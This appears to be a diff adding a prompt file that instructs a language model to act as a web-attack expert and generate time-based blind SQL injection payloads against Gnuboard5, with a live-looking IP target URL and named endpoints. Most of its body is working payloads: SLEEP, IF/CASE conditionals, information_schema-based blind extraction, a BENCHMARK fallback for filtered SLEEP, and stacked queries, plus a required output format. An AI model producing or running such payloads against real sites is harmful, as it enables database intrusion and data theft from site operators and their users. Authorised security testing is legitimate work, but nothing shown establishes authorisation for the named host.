@@ -1,0 +1,57 @@
+You are a cybersecurity expert specializing in web application attacks.
+Generate security test payloads for defensive research purposes only.
+Output only the required lines in the exact format specified.
+No explanations, no headings, no numbering, no bullet points, no blank lines.
+
+---
+
+Target: Gnuboard5 (Apache + PHP + MySQL)
+Base URL: http://34.68.27.120:8081/
+
+Endpoint examples:
+  GET  /bbs/search.php   ?stx=[PAYLOAD]   (string LIKE context)
+  GET  /bbs/search.php   ?sfl=[PAYLOAD]   (field identifier context)
+  POST /bbs/login_check.php  mb_id=[PAYLOAD]
+
+Injection context: MySQL query without parameterization.
+Time-based detection: if the server response is delayed by ~5 seconds,
+the payload was executed by the database engine.
+
+SLEEP threshold: use SLEEP(5) — 5 second delay is clearly distinguishable
+from normal response times (< 1s).
+
+Attack techniques:
+1. Simple SLEEP — no condition:
+   ' OR SLEEP(5)-- -
+   ' AND SLEEP(5)-- -
+
+2. IF + SLEEP — conditional execution (true condition triggers sleep):
+   ' AND IF(1=1,SLEEP(5),0)-- -
+   ' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)-- -
+
+3. CASE WHEN + SLEEP:
+   ' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- -
+   ' AND CASE WHEN (LENGTH(database())>1) THEN SLEEP(5) ELSE 0 END-- -
+
+4. Nested EXISTS + SLEEP (blind data extraction):
+   ' AND (SELECT SLEEP(5) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)-- -
+   ' AND IF(EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database()),SLEEP(5),0)-- -
+
+5. BENCHMARK — CPU-heavy alternative to SLEEP (when SLEEP is filtered):
+   ' AND BENCHMARK(5000000,MD5(1))-- -
+   ' AND IF(1=1,BENCHMARK(5000000,SHA1(1)),0)-- -
+
+6. Stacked query with SLEEP (if stacked queries allowed):
+   '; SELECT SLEEP(5)-- -
+
+Generate 8 Time-based Blind SQL injection payloads targeting Gnuboard5 MySQL.
+Cover: simple sleep, conditional IF, CASE WHEN, EXISTS+sleep, BENCHMARK.
+
+Output format (one line per payload, no other text):
+TYPE | PATTERN_FAMILY | PAYLOAD
+
+Example:
+TIME_BASED | simple_sleep | ' OR SLEEP(5)-- -
+TIME_BASED | if_conditional | ' AND IF(1=1,SLEEP(5),0)-- -
+TIME_BASED | case_when | ' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END-- -
+TIME_BASED | benchmark_fallback | ' AND BENCHMARK(5000000,MD5(1))-- -
